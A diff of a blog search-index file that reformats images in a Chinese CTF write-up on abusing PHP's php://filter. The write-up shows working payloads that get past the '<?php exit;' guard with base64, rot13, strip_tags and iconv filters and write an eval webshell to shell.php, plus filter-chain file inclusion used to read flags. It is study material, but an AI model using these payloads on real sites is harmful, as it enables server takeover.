@@ -1466,7 +1466,7 @@
   <entry>
     <title>filter过滤器利用总结</title>
     <url>/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="对php的filter过滤器利用的总结"><a href="#对php的filter过滤器利用的总结" class="headerlink" title="对php的filter过滤器利用的总结"></a>对php的filter过滤器利用的总结</h1><p>最近打比赛都遇到了这种考点，这里在学习后总结一下。</p>
+    <content><![CDATA[<p>最近打比赛都遇到了这种考点，这里在学习后总结一下。</p>
 <span id="more"></span>
 
 <h3 id="对php-filter的说明"><a href="#对php-filter的说明" class="headerlink" title="对php://filter的说明"></a>对<code>php://filter</code>的说明</h3><h5 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h5><p><code>php://filter</code>是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。</p>
@@ -1508,12 +1508,9 @@
 
 
 <h5 id="重要过滤器"><a href="#重要过滤器" class="headerlink" title="重要过滤器"></a><strong>重要过滤器</strong></h5><h6 id="string-strip-tags："><a href="#string-strip-tags：" class="headerlink" title="string.strip_tags："></a>string.strip_tags：</h6><p>简单说明：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png" class title="image-20240522172738818">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522172738818.png" alt="image-20240522172738818"></p>
 <p>注意：这里虽然说是php7.3.0后废除，但是看了看网上在线的php官方文档&#x3D;&#x3D;直到php8.0还没有完全废弃</p>
-<p>使用此过滤器等同于用<a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()函数</a>处理所有的流数据，官网文档函数说明：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521145500302.png" class title="image-20240521145500302">
-
+<p>使用此过滤器等同于用<a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()函数</a>处理所有的流数据，官网文档函数说明：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521145500302.png" alt="image-20240521145500302"></p>
 <p>这里的标签包含诸如<code>&lt;html&gt;</code>、**<code>&lt;haha</code>**或者<code>&lt;?</code>等标志都会被去除掉，测试一下</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里用函数<span class="title function_ invoke__">strip_tags</span>()来演示：</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="number">1</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;ha&gt;haha&lt;/aher&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：haha</span></span><br><span class="line"><span class="number">2</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了，这是因为虽然不是一个标准的HTML标签，但任然符合标签格式，所以都被当做了html标签被删除</span></span><br><span class="line"><span class="number">3</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：全部被删除了</span></span><br><span class="line"><span class="number">4</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">#结果：&lt; htmlhahaha-flag=&#123;adgaiudgiuag&#125;</span></span><br><span class="line"><span class="number">5</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;htmlhahaha-flag=&#123;adgaiudgiuag&#125; &gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全删</span></span><br><span class="line"><span class="number">6</span>.</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?php htmlhahaha-flag=&#123;adgaiudgiuag&#125;?&gt;&#x27;</span></span><br><span class="line"><span class="comment">#结果：全部被删除，php元素应该是会全部被删除</span></span><br></pre></td></tr></table></figure>
 
@@ -1580,22 +1577,14 @@
 <p><code>phpexit</code>一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加一个”a”一共8个字符。这样，<code>phpexita</code>被正常解码，而后面我们传入的webshell的base64内容页被正常解码，结果就是<code>&lt;?php exit;?&gt;</code>没有了。</p>
 <p><strong>最后效果</strong></p>
 <p>成功写入：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191114493.png" class title="image-20240521191114493">
-
-<p>成功执行：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191420996.png" class title="image-20240521191420996">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191114493.png" alt="image-20240521191114493"></p>
+<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521191420996.png" alt="image-20240521191420996"></p>
 <h4 id="利用rot13编码"><a href="#利用rot13编码" class="headerlink" title="利用rot13编码"></a>利用rot13编码</h4><p><strong>条件</strong>：<code>short_open_tag = off</code>,即不开启短标签（也许默认为On，自己的配置就是）</p>
 <p>原理和上面类似，核心是将“死亡exit”去除，<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在不开启<code>short_open_tag</code>时，php不认识这个字符串，当然也就不会执行。</p>
 <p><strong>最后效果</strong></p>
 <p>成功写入：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521194945000.png" class title="image-20240521194945000">
-
-<p>成功执行：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521195044746.png" class title="image-20240521195044746">
-
-
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521194945000.png" alt="image-20240521194945000"></p>
+<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521195044746.png" alt="image-20240521195044746"></p>
 <p><strong>同时经测试，将条件改为On，不能执行。</strong></p>
 <h4 id="利用字符串操作方法"><a href="#利用字符串操作方法" class="headerlink" title="利用字符串操作方法"></a>利用字符串操作方法</h4><p>这里就需要用到上面阐述过的<code>string.strip_tags</code>，在测试代码中：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
@@ -1605,22 +1594,11 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=12.txt&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#为了防止想传入的数据也被去除掉，所以这里也将内容编码一下</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>最后效果</strong></p>
-<p>成功写入：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201629726.png" class title="image-20240521201629726">
-
-<p>成功执行：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201701528.png" class title="image-20240521201701528">
-
-
-
+<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201629726.png" alt="image-20240521201629726"></p>
+<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521201701528.png" alt="image-20240521201701528"></p>
 <p><strong>这个方法的做题记录：</strong><br>写入：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png" class title="image-20240521202558001">
-
-<p>利用：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png" class title="image-20240521202621401">
-
-
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202558001.png" alt="image-20240521202558001"></p>
+<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240521202621401.png" alt="image-20240521202621401"></p>
 <h4 id="代码变形bypass"><a href="#代码变形bypass" class="headerlink" title="代码变形bypass"></a>代码变形bypass</h4><p>对于这个板块的代码可利用的有三种，总结一下(注意融汇贯通，比如下面的<code>convert.iconv*</code>也许也能用于起亚抢矿，注重思考)</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种情况，就是上面说的那种：</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;],&quot;&lt;?php exit();&quot;.$_POST[&#x27;content&#x27;]); </span><br><span class="line"></span><br><span class="line">第二种：相同变量</span><br><span class="line">$content = $GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit;&#x27;.$content);</span><br><span class="line"></span><br><span class="line">第三种</span><br></pre></td></tr></table></figure>
 
@@ -1633,8 +1611,7 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/convert.base64-decode/resource=2.txt&#x27;</span>,<span class="string">&#x27;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>成功向2.txt文件写入东西</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522131121762.png" class title="image-20240522131121762">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522131121762.png" alt="image-20240522131121762"></p>
 <p>确实存在这个问题，<strong>需要注意</strong></p>
 <p>——————</p>
 <p>常规可想到的payload</p>
@@ -1663,11 +1640,8 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">测试代码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">传入的payload:</span><br><span class="line">php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br><span class="line"> 拼接完后即是：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>;php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br></pre></td></tr></table></figure>
 
 <p>最终结果：<br>成功写入：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194848128.png" class title="image-20240522194848128">
-
-<p>成功执行：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194907522.png" class title="image-20240522194907522">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194848128.png" alt="image-20240522194848128"></p>
+<p>成功执行：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194907522.png" alt="image-20240522194907522"></p>
 <h6 id="convert-iconv-1"><a href="#convert-iconv-1" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h6><p>对于<code>iconv</code>字符编码转换进行绕过的手法，类似于上面所述的<code>rot13</code>方法，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。（注意：不出意外的话应该是只有类似”同族“的编码方式才能这样转换）</p>
 <ul>
 <li><strong>usc-2</strong></li>
@@ -1680,11 +1654,8 @@
 
 <p>最后效果：</p>
 <p>成功写入：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201457636.png" class title="image-20240522201457636">
-
-<p>成功利用：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201556443.png" class title="image-20240522201556443">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201457636.png" alt="image-20240522201457636"></p>
+<p>成功利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201556443.png" alt="image-20240522201556443"></p>
 <ul>
 <li><strong>usc-4</strong></li>
 </ul>
@@ -1696,13 +1667,9 @@
 
 <p>最终效果：</p>
 <p>写入：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202744151.png" class title="image-20240522202744151">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202744151.png" alt="image-20240522202744151"></p>
 <p>利用：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202830720.png" class title="image-20240522202830720">
-
-
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202830720.png" alt="image-20240522202830720"></p>
 <ul>
 <li>utf8-utf7</li>
 </ul>
@@ -1722,16 +1689,8 @@
 <p>最终payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
 
-<p>成功写入：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522212950464.png" class title="image-20240522212950464">
-
-<p>利用：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522213035987.png" class title="image-20240522213035987">
-
-
-
-
-
+<p>成功写入：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522212950464.png" alt="image-20240522212950464"></p>
+<p>利用：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522213035987.png" alt="image-20240522213035987"></p>
 <p>参考文章：</p>
 <p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>
 <p><code>https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</code></p>
@@ -1763,41 +1722,30 @@
 <p>有附件，可以知道index.php的内容为<code>&lt;?php include_once($_REQUEST[&#39;file&#39;]);</code>，waf了很多，这里可以通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</p>
 <p>项目地址：<code>https://github.com/synacktiv/php_filter_chain_generator</code>，直接利用这个脚本生成</p>
 <p>如下：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152334913.png" class title="image-20240527152334913">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152334913.png" alt="image-20240527152334913"></p>
 <p>成功得到flag</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152405691.png" class title="image-20240527152405691">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152405691.png" alt="image-20240527152405691"></p>
 <p><strong>这里可以利用的原因</strong>就在于<code>php://temp</code>，经过一系列过滤器处理后的数据被传递给了<code>php://temp</code>流，这意味着最终的数据被写入了一个临时文件中。这个临时文件中包含了经过处理的数据，由此可以用于文件包含。</p>
 <h6 id="用于构造任意字符串"><a href="#用于构造任意字符串" class="headerlink" title="用于构造任意字符串"></a>用于构造任意字符串</h6><p>其实本质和上面那个差不多，这里记录一下做法而已，对于为什么会在前面构造出想要的字符串，看参考文章。</p>
 <p><strong>连连看到底是连连什么看</strong></p>
 <p>题目描述：到底连连什么看才对呢？（flag在根目录&#x2F;flag下）</p>
 <p>——————</p>
-<p>开题就是一个小游戏，查看源码看到如下：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154205080.png" class title="image-20240527154205080">
-
+<p>开题就是一个小游戏，查看源码看到如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154205080.png" alt="image-20240527154205080"></p>
 <p>直接尝试文件包含<code>?file=/flag</code>,显示：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154253580.png" class title="image-20240527154253580">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154253580.png" alt="image-20240527154253580"></p>
 <p>直接跳转到这个文件，得到php代码，如下：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>此时就需要借鉴这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
-<p>这里我们并不能保证<code>/etc/passwd</code>内容为想要的<code>XYCTF</code>，而且一般都不是，考点不会这么简单，这里估计想考的就是利用filter chain构造任意字符串，如下：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154613313.png" class title="image-20240527154613313">
-
+<p>这里我们并不能保证<code>/etc/passwd</code>内容为想要的<code>XYCTF</code>，而且一般都不是，考点不会这么简单，这里估计想考的就是利用filter chain构造任意字符串，如下：<br><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154613313.png" alt="image-20240527154613313"></p>
 <p>我们本地看看结果是什么</p>
